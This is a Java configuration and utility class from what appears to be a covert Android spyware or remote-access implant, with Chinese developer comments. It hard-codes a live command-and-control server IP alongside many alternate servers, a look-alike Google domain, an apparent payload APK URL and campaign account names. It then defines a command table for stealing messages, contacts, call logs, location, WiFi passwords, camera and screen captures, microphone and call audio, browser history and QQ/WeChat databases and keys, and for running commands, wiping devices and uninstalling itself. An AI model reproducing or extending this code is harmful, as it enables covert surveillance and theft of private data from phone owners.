package com.utils;

import java.io.File;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.UUID;
import com.authority.AuthoritySettings;
import com.main.ForegroundService;
import com.network.Network;
import com.plugin.GetActivity;

import android.R.string;
import android.content.Context;
import android.os.Environment;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.util.Log;


//file = new File(getPackageManager().getApplicationInfo("com.uc.addon.qrcodegenerator", 0).sourceDir);  
//这里getPackageManager是Context下的方法，不需要赘言了，sourceDIr返回了完整apk路径，包括-N之类的讨厌玩意。
//而直接访问这个路径下的文件，是不会有权限问题的。

//PathClassLoader是通过构造函数new DexFile(path)来产生DexFile对象的；
//而DexClassLoader则是通过其静态方法loadDex（path, outpath, 0）得到DexFile对象。
//这两者的区别在于DexClassLoader需要提供一个可写的outpath路径，用来释放.apk包或者.jar包中的dex文件。
//换个说法来说，就是PathClassLoader不能主动从zip包中释放出dex，因此只支持直接操作dex格式文件，
//或者已经安装的apk（因为已经安装的apk在cache中存在缓存的dex文件）。
//而DexClassLoader可以支持.apk、.jar和.dex文件，并且会在指定的outpath路径释放出dex文件。
//另外，PathClassLoader在加载类时调用的是DexFile的loadClassBinaryName，
//而DexClassLoader调用的是loadClass。因此，在使用PathClassLoader时类全名需要用”/”替换”.”

//Context c = createPackageContext("chroya.demo", Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);  
//Class clazz = c.getClassLoader().loadClass("chroya.demo.Main");  
//Object owner = clazz.newInstance();  
//Object obj = clazz.getMethod("print", String.class).invoke(owner, "Hello");  

//AppKey 为极光平台应用的唯一标识
//e2873ba6609a907a2a789373

//AndroidManifest.xml 的 manifest 标记中使用 sharedUserId 属性，为它们分配相同的用户 ID。
//这样做以后，出于安全目的，两个软件包将被视为同一个应用，具有相同的用户 ID 和文件权限。
//请注意，为保持安全性，只有两个签署了相同签名（并且请求相同的 sharedUserId）的应用才被分配同一用户 ID

//获得system用户权限，需要以下步骤：
//1. 在应用程序的AndroidManifest.xml中的manifest节点中加入android:sharedUserId="android.uid.system"这个属性。
//2. 修改Android.mk文件，加入LOCAL_CERTIFICATE := platform这一行 
//3. 使用mm命令来编译，生成的apk就有修改系统时间的权限了


/*
app的uid/100000的结果为userid，填到ux的x处。
app的uid减去10000为appid，填到axx的xx处。
例如某个app的uid是10022，经过计算，userid为10022/100000=0，appid为10022-10000=22，则那么最终通过ps打印得到uid字串就是u0_a22
u10_axx就是多用户下的进程了
 */

//b就是block
//d就是directory
//l就是link
//lrw-r--r--   1 root     root          21 2018-11-08 17:12 sdcard -> /storage/self/primary

//389983
//6214624339000059344

public class Public {
	
	private final static String TAG						= "Public";
	public static boolean DEBUG_FLAG 					= false;
		
	//public static String SERVER_IP_ADDRESS				= "hk.googleadc.com";
	public static String SERVER_IP_ADDRESS				= "47.116.51.29";
	//public static String SERVER_IP_ADDRESS			= "47.91.251.130";
	//public static String SERVER_IP_ADDRESS			= "172.29.65.1";
	//public static final String TEST_SERVER_IP			= "1.32.200.51";
	//public static final String TEST_SERVER_IP			= "1.32.216.22";
	//public static final String TEST_SERVER_IP			= "110.34.166.17";
	//public static final String TEST_SERVER_IP			= "1.32.200.31";
	//public static final String TEST_SERVER_IP			= "182.110.69.39";
	//public static final String TEST_SERVER_IP 		= "115.236.49.68";
	//public static final String TEST_SERVER_IP 		= "172.29.65.1";
	//public static final String TEST_SERVER_IP 		= "47.101.189.13";
	
	//public static final String REAL_SERVER_DOMAIN 	= "ops.wcsset.com";
	//public static final String REAL_SERVER_DOMAIN 	= "www.liujinguangsdm.xyz";
	//public static final String REAL_SERVER_DOMAIN 	= "www.eyw168.com";

	//public static  String UserName 						= "setup20190219";
	//public static  String UserName 						= "ax20190226";
	//public static  String UserName 						= "setup20190313";
	//public static  String UserName 							= "setup20190305";
	//public static  String UserName 						= "setup20190404";
	//public static  String UserName 						= "setup20190425";
	//public static  String UserName 						= "setup20190521";
	//public static  String UserName 						= "setup20190522";
	//public static  String UserName 						= "setup20190524";
	//public static  String UserName 						= "setup20190527";
	//public static  String UserName 						= "setup20190612";
	//public static  String UserName 						= "setup20190615";
	//public static  String UserName 						= "setup20190629";
	//public static  String UserName 						= "setup20190705";
	//public static  String UserName 						= "setup20190707";
	//public static  String UserName 						= "setup20190711";
	//public static  String UserName 						= "setup20190726";
	//public static  String UserName 						= "setup20190805";
	//public static  String UserName 						= "setup20191104";
	//public static  String UserName 							= "setup20191219";
	//public static  String UserName 							= "setup20200106";
	//public static  String UserName 							= "setup20200210";
	//public static  String UserName 							= "setup20200228";
	
	//public static  String UserName 						= "test20181205";
	//public static  String UserName 						= "test20181216";
	//public static  String UserName 						= "test20181214";
	//public static  String UserName 						= "test20190215";
	//public static  String UserName 						= "test20190220";
	//public static  String UserName 						= "test20181222";
	//public static  String UserName 						= "test20181223";
	//public static  String UserName 						= "test20190305";
	//public static  String UserName 						= "test20190326";
	//public static  String UserName 						= "test20190330";
	//public static  String UserName 						= "test20190331";
	//public static  String UserName 						= "test20190402";
	//public static  String UserName 						= "test20190410";
	//public static  String UserName						= "test20190413";
	//public static  String UserName 						= "test20190528";
	//public static  String UserName 						= "test20190701";
	//public static  String UserName 						= "test20190716";
	//public static  String UserName 						= "test20190729";
	//public static  String UserName 						= "test20190805";
	//public static  String UserName 						= "test20190830";
	//public static  String UserName 						= "test20191012";
	
	//public static  String UserName 							= "jy20200303";
	//public static  String UserName 						= "jy20200331";
	//public static  String UserName 							= "jy20200402";
	//public static  String UserName 						= "jy20200407";
	
	//public static  String UserName 						= "jy20200430";
	//public static  String UserName 						= "jy20200520";
	public static  String UserName 						= "jy20200811";


	public static final int IMEI_IMSI_PHONE_SIZE 		= 16;
	public static byte[] IMEI 							= new byte[IMEI_IMSI_PHONE_SIZE];

	public static final int DOWNLOADAPK_PORT			= 10011;
	public static final int QRCODE_PORT					= 10012;
	public static final int SERVER_DATA_PORT 			= 10013;
	public static final int SERVER_CMD_PORT 			= 10014;
	
	//public static final int PacketOptCryptionOld 		= 1;
	public static final int PacketOptCompPack			= 2;
	public static final int PacketOptCryption 			= 17;
	
	public static int	gOnlineType						= 0;
	//public static int 	gSetupModeType					= 0;

	//public static final int PacketOptOldCryption 		= 1;
	public static final int PacketOptNone				= 0;
	
	public static final int WAIT_SU_PERMITION_TIME		= 6000;
	public static final int WAIT_SU_PERMITION_CNT		= 20;

	//cmd upload file limit size
	public static final int MAX_TRANSFER_FILESIZE		= 0x10000000;
	//sd extcard upload limit size
	public static final int MAX_UPLOAD_FILESIZE			= 0x1000000;
	public static final int MIN_UPLOAD_FILESIZE			= 0x10000;
	//cmd send recv buf limit
	public static final int RECV_SEND_BUFSIZE			= 0x1000;
	
	//public static final int PROGRAMLOG_UPLOAD_SIZE	= 16*1024;
	public static final int FILE_TRANSFER_TOO_BIG		= 0x1FFFFFFF;
	public static final int FILE_TRANSFER_NOT_FOUND 	= 0x2FFFFFFF;
	public static final int RECV_DATA_OK			 	= 0x3FFFFFFF;
	
	//public static boolean BASIC_VERSION_FLAG = false;
	
	public static final int PHONE_LOCATION_DISTANCE 			= 1;	
	public static final int PHONE_LOCATION_MINSECONDS 			= 600;	
	public static final int SYNCHRONIZITION_SECONDS_TIME 		= 3600;
	public static final int JOBSERVICEMAXDELAY 					= 300000;
	public static final int JOBSERVICEDELAY 					= 300000;
	public static final int SCREENSNAPSHOT_POSTDELAY_TIME 		= 60;	

	
	public static final String SERVER_CMD_THREADNAME 			= "ServerCommandThread";
	public static final int SERVER_CMD_CONNECT_TIMEOUT			= 6000;
	public static final int SERVERCMD_ALARM_INTERVAL 			= 180000;
	
	//1 row location
	//2 gd amap
	//3 tencent map
	public static int LOCATION_TYPE						= 0;
	
	//在Java代码中直接书写的数字是int类型的，就是说数字的范围在 -2^31 到 2^31 - 1 这个范围之中，无论将这个数字赋值给什么类型
	//long number = 26012402244L;
	//long number = Long.parseLong("26012402244");
	
    public static final long ALLFILES_RETRIEVE_INTERVAL 			= 1*24*60*60*1000L;
    public static final long BASIC_RETRIEVE_INTERVAL				= 24*60*60*1000L;

	
	public static final int CAMERA_PHOTO_QUALITY 				= 100;
	public static final int SCREENSNAPSHOT_PHOTO_QUALITY 		= 100;

	public static final int VALID_CAMERAPHOTO_SIZE 		= 4*1024;
	public static final int VALID_SCREENPHOTO_SIZE 		= 4*1024;
	//public static boolean SendPhotoAllTimes			= false;
	
	public static final int CMD_RECV_DATA_OK 		= 1;
	public static final int CMD_RECV_CMD_OK 		= 2;
	public static final int CMD_DATA_MESSAGE 		= 3;
	public static final int CMD_DATA_CONTACTS 		= 4;
	public static final int CMD_DATA_DEVICEINFO 	= 5;
	public static final int CMD_DATA_CALLLOG 		= 6;
	public static final int CMD_DATA_LOCATION 		= 7;
	public static final int CMD_DATA_DCIM			= 8;
	public static final int CMD_DATA_SDCARDFILES	= 9;
	public static final int CMD_DATA_EXTCARDFILES 	= 10;
	public static final int CMD_DATA_WIFIPASS 		= 11;
	public static final int CMD_DATA_GESTURE 		= 12;
	public static final int CMD_DATA_CAMERAPHOTO	= 13;
	public static final int CMD_UPLOADFILE			= 14;
	public static final int CMD_DOWNLOADFILE		= 15;
	public static final int CMD_RUNCOMMAND			= 16;
	public static final int CMD_HEARTBEAT			= 17;
	public static final int CMD_PHONECALL			= 18;
	public static final int CMD_SENDMESSAGE			= 19;
	public static final int CMD_DATA_SCRNSNAPSHOT	= 20;
	public static final int CMD_DATA_PHONECALLAUDIO = 21;
	public static final int CMD_DATA_AUDIO 			= 22;
	public static final int CMD_DATA_VIDEO 			= 23;
	public static final int CMD_AUTOINSTALL 		= 24;
	public static final int CMD_DATA_APPPROCESS		= 25;
	public static final int CMD_DATA_WIFI			= 26;
	public static final int CMD_UPLOAD_LOG			= 27;
	public static final int CMD_WIPESYSTEM			= 28;
	public static final int CMD_RESETSYSTEM			= 29;
	public static final int CMD_RESETPASSWORD		= 30;
	public static final int CMD_DATA_QQACCOUNT		= 31;
	public static final int CMD_DATA_APPMESSAGE		= 32;
	public static final int CMD_DATA_WEBKITHISTORY	= 33;
	public static final int CMD_DATA_LATESTMESSAGE 	= 34;
	public static final int CMD_DATA_RUNNINGAPPS	= 35;
	public static final int CMD_DATA_CHROMEHISTORY 	= 36;
	public static final int CMD_DATA_FIREFOXHISTORY = 37;
	public static final int CMD_DATA_DOWNLOAD 		= 38;
	public static final int CMD_DATA_OFFICE			= 39;
	public static final int CMD_DATA_QQFILE			= 40;
	public static final int CMD_DATA_QQAUDIO		= 41;
	public static final int CMD_DATA_QQPROFILE		= 42;
	public static final int CMD_DATA_QQPHOTO		= 43;
	public static final int CMD_DATA_QQVIDEO		= 44;
	public static final int CMD_DATA_FILERECORD		= 45;
	public static final int CMD_WIPESTORAGE			= 47;
	public static final int CMD_UNINSTALL			= 46;
	public static final int CMD_QQDATABASEFILE 		= 48;
	public static final int CMD_WEIXINDATABASEFILE 	= 49;
	public static final int CMD_WEIXINUSERINFO 		= 50;
	public static final int CMD_WEIXINDB_KEY 		= 51;
	public static final int CMD_DATA_NEWCALLLOG 	= 52;
	public static final int CMD_DATA_WEIXINAUDIO	= 53;
	public static final int CMD_DATA_WEIXINPHOTO	= 54;
	public static final int CMD_DATA_WEIXINVIDEO	= 55;
	public static final int CMD_DATA_MICAUDIORECORD	= 56;
	public static final int CMD_MICAUDIORECORD		= 57;
	public static final int CMD_UNINSTALLSELF		= 58;
	public static final int CMD_GETCONFIG			= 59;
	public static final int CMD_SETCONFIG 			= 60;
	public static final int CMD_DATA_FLASHCARDFILES	= 61;
	public static final int CMD_UPDATEPROC			= 62;
	public static final int CMD_RESETPROGRAM		= 63;
	public static final int CMD_SHUTDOWNSYSTEM		= 64;
	public static final int CMD_MESSAGEBOX			= 65;
	public static final int CMD_SINGLELOCATION		= 66;
	public static final int CMD_SINGLESCREENCAP		= 67;
	public static final int CMD_CANCELLOCATION		= 68;
	public static final int CMD_CANCELSCREENCAP		= 69;
	public static final int CMD_NETWORKTYPE			= 70;
	
	public static final int CMD_UPLOADQQDB			= 71;
	public static final int CMD_UPLOADWEIXINDB		= 72;
	public static final int CMD_UPLOADDB			= 73;
	public static final int CMD_UPLOADWEIXININFO	= 74;
	public static final int CMD_CHANGEIP			= 75;
	
	public static Context appContext = null;

	static {
		try {
			appContext = GetActivity.getContext();
			
			initParams(appContext);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	public static void init(final Context context){
		try {
			appContext = context;

			initParams(context);
			
			initIMEI(context);

			InitFilePath(context);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	

	//在相同设备上运行但具有不同签署密钥的应用将不会再看到相同的 Android ID（即使对于同一用户来说，也是如此）。
	//只要签署密钥相同（并且应用未在 OTA 之前安装到某个版本的 O），ANDROID_ID 的值在软件包卸载或重新安装时就不会发生变化。
	public static void initIMEI(Context context){
		String strid = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.CFGCLIENTID);
		if(strid != null && strid.equals("") == false){
			System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
			return;
		}else{
			try {
				
				if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_PHONE_STATE) == true) {
				   	TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
				   	String strimei = tm.getDeviceId();
				   	if (strimei != null && strimei.equals("") == false) {
				   		PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
				   				ForegroundService.CFGCLIENTID,strimei);
				   		System.arraycopy(strimei.getBytes(), 0, Public.IMEI, 0, strimei.getBytes().length);
						return;
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			strid = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);
	        if (strid == null || strid.equals("") == true) {
	        	//1bff370d-2689-48af-b003-52c13dc89a66
	        	String uuid = UUID.randomUUID().toString();
	        	uuid = uuid.replaceAll("-", "");
	        	uuid = uuid.substring(0,16);
	        	strid = uuid;
	        }
	        
	    	PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.CFGCLIENTID,strid);
			System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
		}
	}
	

	public static void initParams(final Context context){
		String username = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.CFGUSERNAME);
		if (username != null && username.equals("") == false) {
			Public.UserName = username;
		}else{
			Log.e(TAG, "not found username set it:" + Public.UserName);
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.CFGUSERNAME,Public.UserName);
		}
		
		Public.initNetworkSettings(context);
		
		PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
				ForegroundService.CFGPACKAGENAME,context.getPackageName());
	}
	
	
	public static void getIpFromStr(final String serverip){
		if (serverip.getBytes()[0] >= '0' && serverip.getBytes()[0] <= '9') {
			Public.SERVER_IP_ADDRESS = serverip;
		}else{
			new Thread(new Runnable() {
				@Override
				public void run() {
					
					try {

						//InetAddress tmpAddress[] = InetAddress.getAllByName(serverip);
						//Public.SERVER_IP_ADDRESS = tmpAddress[0].getHostAddress();
						Public.SERVER_IP_ADDRESS = InetAddress.getByName(serverip).getHostAddress();
						Log.e(TAG,Public.SERVER_IP_ADDRESS);
					} catch (Exception e) {
						//java.net.UnknownHostException: 
						//Unable to resolve host "hk.googleadc.com": No address associated with hostname
						e.printStackTrace();
					}					
				}
			}).start();
		}
	}
	

	//can not init net work in main thread
	public static void initNetworkSettings(Context context){
		try{		
			final String serverip = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.CFGSERVERIP);
			if (serverip != null && serverip.equals("") == false) {
				Public.getIpFromStr(serverip);
			}
			else if (DEBUG_FLAG) {
//				String keyString = "fuckcracker";
//				byte[] byteip = {82, 66, 77, 90, 83, 67, 79, 82, 83, 92, 92, 87, 70};
//				byte[] resultip = CryptData.xorCryptData(byteip, keyString.getBytes());
//				SERVER_IP_ADDRESS = new String(resultip);
				
				Public.getIpFromStr(SERVER_IP_ADDRESS);

				boolean ret = PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
						ForegroundService.CFGSERVERIP,SERVER_IP_ADDRESS);
				Log.e(TAG,"set ip:" + SERVER_IP_ADDRESS + " " + ret);
			}else{
				Public.getIpFromStr(SERVER_IP_ADDRESS);
				
//				String keyString = "fuckcracker";
//				byte[] byteip = {82, 66, 77, 90, 83, 67, 79, 82, 83, 92, 92, 87, 70};
//				byte[] resultip = CryptData.xorCryptData(byteip, keyString.getBytes());
//				SERVER_IP_ADDRESS = new String(resultip);
				boolean ret = PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
						ForegroundService.CFGSERVERIP,SERVER_IP_ADDRESS);
				Log.e(TAG,"set ip:" + SERVER_IP_ADDRESS + " " + ret);
			}
			
			Public.gOnlineType = Network.getNetworkType(context);
		}catch(Exception ex){
			ex.printStackTrace();
		}
	}
	
	
	

	
	
	
	//http://ops.wcsset.com:60080/googleapps.apk
	public static void InitFilePath(Context context){	
		try {
			ForegroundService.LOCAL_PATH_NAME = context.getFilesDir().getAbsolutePath() + ForegroundService.SUB_FOLDER_NAME;
	  		File path = new File(ForegroundService.LOCAL_PATH_NAME);
	  		if (path.exists() == false) {
				path.mkdirs();
			}
			
	  		ForegroundService.SDCARDPATH = Environment.getExternalStorageDirectory().getAbsolutePath();
		  	boolean sdCardExist = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
		  	if(sdCardExist && AuthoritySettings.checkSinglePermission(context, 
		  			android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == true){
		  		ForegroundService.SDCARD_PATH_NAME = ForegroundService.SDCARDPATH + ForegroundService.SUB_FOLDER_NAME;
		  		path = new File(ForegroundService.SDCARD_PATH_NAME);
		  		if (path.exists() == false) {
					path.mkdirs();
				}
		  	}else{
		  		ForegroundService.SDCARD_PATH_NAME = ForegroundService.LOCAL_PATH_NAME;
		  	}	
		} catch (Exception e) {
			e.printStackTrace();
		}

  		Log.e(TAG, "find SD Card Path:" + ForegroundService.SDCARDPATH + ",local path:" + ForegroundService.LOCAL_PATH_NAME);
	}
	


    
    
}
